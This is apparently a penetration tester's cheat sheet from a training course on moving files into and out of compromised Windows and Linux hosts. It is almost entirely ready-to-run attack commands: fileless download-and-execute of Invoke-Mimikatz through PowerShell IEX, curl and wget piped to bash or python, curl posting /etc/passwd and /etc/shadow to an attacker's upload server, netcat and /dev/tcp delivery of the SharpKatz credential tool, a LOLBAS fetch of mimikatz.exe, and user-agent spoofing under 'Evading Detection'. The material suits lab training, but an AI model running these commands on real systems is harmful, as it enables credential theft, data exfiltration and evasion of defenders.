# Windows File Transfer Methods
## PowerShell Base64 Encode & Decode
#### Check SSH Key MD5 Hash
```shell
md5sum id_rsa
```
`4e301756a07ded0a2dd6953abf015278  id_rsa`
#### Encode SSH Key to Base64
```shell
cat id_rsa |base64 -w 0;echo
```
#### Windows Powershell
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<HASH>"))
```
#### Confirming the MD5 Hashes Match
```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
## PowerShell Web Downloads

| Method                 | Description                                                           |
|------------------------|-----------------------------------------------------------------------|
| `OpenRead`             | Returns the data from a resource as a Stream.                         |
| `OpenReadAsync`        | Returns the data from a resource without blocking the calling thread. |
| `DownloadData`         | Downloads data from a resource and returns a Byte array.              |
| `DownloadDataAsync`    | Downloads data from a resource and returns a Byte array without blocking the calling thread. |
| `DownloadFile`         | Downloads data from a resource to a local file.                       |
| `DownloadFileAsync`    | Downloads data from a resource to a local file without blocking the calling thread. |
| `DownloadString`       | Downloads a String from a resource and returns a String.              |
| `DownloadStringAsync`  | Downloads a String from a resource without blocking the calling thread. |
### PowerShell DownloadFile Method
#### File Download
```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

```powershell
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```
#### PowerShell DownloadString - Fileless Method
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
#### PowerShell Invoke-WebRequest
```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
#### Common Errors with PowerShell
There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.
This can be bypassed using the parameter `-UseBasicParsing`.
```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
```
Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```
## SMB Downloads
#### Create the SMB Server
```shell
sudo impacket-smbserver share -smb2support ~/Downloads
```
#### Copy a File from the SMB Server
```cmd
copy \\192.168.220.133\share\nc.exe
```
New versions of Windows block unauthenticated guest access, as we can see in the following command:
```cmd
copy \\192.168.220.133\share\nc.exe
```
To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:
#### Create the SMB Server with a Username and Password
```shell
sudo impacket-smbserver share -smb2support ~/Downloads -user test -password test
```
#### Mount the SMB Server with Username and Password
```cmd
net use n: \\192.168.220.133\share /user:test test
```
## FTP Downloads
#### Setting up a Python3 FTP Server
```shell
sudo python3 -m pyftpdlib --port 21
```
#### Transfering Files from an FTP Server Using PowerShell
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
#### Create a Command File for the FTP Client and Download the Target File
```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

```ftp
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
```
## Upload Operations
#### Encode File Using PowerShell
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

```powershell
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```
#### Decode Base64 String in Linux
```shell
echo <HASH> | base64 -d > hosts
```

```shell
md5sum hosts 
```
## PowerShell Web Uploads
#### Configure WebServer with Upload
```shell
python3 -m uploadserver
```
#### PowerShell Script to Upload a File to Python Upload Server
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```
```powershell
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
### PowerShell Base64 Web Upload
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```
```powershell
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
###### NETCAT
```shell
nc -lvnp 8000
```

```shell
echo <base64> | base64 -d -w 0 > hosts
```
## SMB Uploads
#### Configuring WebDav Server
```shell
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
#### Connecting to the Webdav Share
```cmd
dir \\192.168.49.128\DavWWWRoot
```
#### Uploading Files using SMB
```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
## FTP Uploads
```shell
sudo python3 -m pyftpdlib --port 21 --write
```
#### PowerShell Upload File
```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
#### Create a Command File for the FTP Client to Upload a File
```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
```ftp
open 192.168.49.128
USER anonymous
PUT c:\windows\system32\drivers\etc\hosts
bye
```
# Linux File Transfer Methods
## Web Downloads with Wget and cURL
#### Download a File Using wget
```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
#### Download a File Using cURL
```shell
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
#### Fileless Download with cURL
```shell
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
#### Fileless Download with wget
```shell
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
## Download with Bash (/dev/tcp)
#### Connect to the Target Webserver
```shell
exec 3<>/dev/tcp/10.10.10.32/80
```
#### HTTP GET Request
```shell
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
#### Print the Response
```shell
cat <&3
```
## SSH Downloads
#### Enabling the SSH Server
```shell
sudo systemctl enable ssh
```
#### Starting the SSH Server
```shell
sudo systemctl start ssh
```
#### Checking for SSH Listening Port
```shell
netstat -lnpt
```
#### Linux - Downloading Files Using SCP
```shell
scp plaintext@192.168.49.128:/root/myroot.txt . 
```
## Upload Operations
## Web Upload
#### Pwnbox - Start Web Server
```shell
sudo python3 -m pip install --user uploadserver
```
#### Pwnbox - Create a Self-Signed Certificate
```shell
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
#### Pwnbox - Start Web Server
```shell
mkdir https && cd https
```
```shell
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
#### Linux - Upload Multiple Files
```shell
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
## Alternative Web File Transfer Method
#### Linux - Creating a Web Server with Python3
```shell
python3 -m http.server
```
#### Linux - Creating a Web Server with Python2.7
```shell
python2.7 -m SimpleHTTPServer
```
#### Linux - Creating a Web Server with PHP
```shell
php -S 0.0.0.0:8000
```
#### Linux - Creating a Web Server with Ruby
```shell
ruby -run -ehttpd . -p8000
```
#### Download the File from the Target Machine onto the Pwnbox
```shell
wget 192.168.49.128:8000/filetotransfer.txt
```
## SCP Upload
#### File Upload using SCP
```shell
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```
# Transferring Files with Code
## Python
#### Python 2 - Download
```shell
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
#### Python 3 - Download
```shell
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
### Python3 - Upload
#### Starting the Python uploadserver Module
```shell
python3 -m uploadserver 
```
#### Uploading a File Using a Python One-liner
```shell
python3 -c 'import requests;requests.post("http:<IP>//:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
##### Commands Explained
```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```
## PHP
#### PHP Download with File_get_contents()
```shell
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
#### PHP Download with Fopen()
```shell
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
#### PHP Download a File and Pipe it to Bash
```shell
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
## Other Languages
#### Ruby - Download a File
```shell
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
#### Perl - Download a File
```shell
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
## JavaScript
### wget.js
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
#### Download a File Using JavaScript and cscript.exe
##### Windows CMD
```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
## VBScript
### wget.vbs
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
### Download a File Using VBScript and cscript.exe
```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```
# Miscellaneous File Transfer Methods
## File Transfer with Netcat and Ncat
#### NetCat - Compromised Machine
```shell
nc -l -p 8000 > SharpKatz.exe
```
#### Ncat - Compromised Machine
```shell
ncat -l -p 8000 --recv-only > SharpKatz.exe
```
#### Netcat - Attack Host - Sending File to Compromised machine
```shell
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
```
```shell
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
#### Ncat - Attack Host - Sending File to Compromised machine
```shell
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
```
```shell
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
#### Attack Host - Sending File as Input to Netcat
```shell
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
#### Compromised Machine Connect to Netcat to Receive the File
```shell
nc 192.168.49.128 443 > SharpKatz.exe
```
#### Attack Host - Sending File as Input to Ncat
```shell
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
#### Compromised Machine Connect to Ncat to Receive the File
```shell
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
#### NetCat - Sending File as Input to Netcat
```shell
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
#### Ncat - Sending File as Input to Netcat
```shell
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
```shell
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
## PowerShell Session File Transfer
#### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01
```powershell
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01

PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
```
#### Create a PowerShell Remoting Session to DATABASE01
```powershell
$Session = New-PSSession -ComputerName DATABASE01
```
#### Copy samplefile.txt from our Localhost to the DATABASE01 Session
```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
#### Copy DATABASE.txt from DATABASE01 Session to our Localhost
```powershell
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
## RDP
#### Mounting a Linux Folder Using rdesktop
```shell
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
#### Mounting a Linux Folder Using xfreerdp
```shell
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
# Protected File Transfers
## File Encryption on Windows
#### Invoke-AESEncryption.ps1
```powershell
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 

Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
```
#### Import Module Invoke-AESEncryption.ps1
```powershell
Import-Module .\Invoke-AESEncryption.ps1
```
#### File Encryption Example
```powershell
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```
## File Encryption on Linux
#### Encrypting /etc/passwd with openssl
```shell
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```
#### Decrypt passwd.enc with openssl
```shell
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```
# Evading Detection
## Changing User Agent
#### Listing out User Agents
```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```
#### Request with Chrome User Agent
```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
```

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

```shell
nc -lvnp 80
```
## LOLBAS / GTFOBins
#### Transferring File with GfxDownloadWrapper.exe
```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```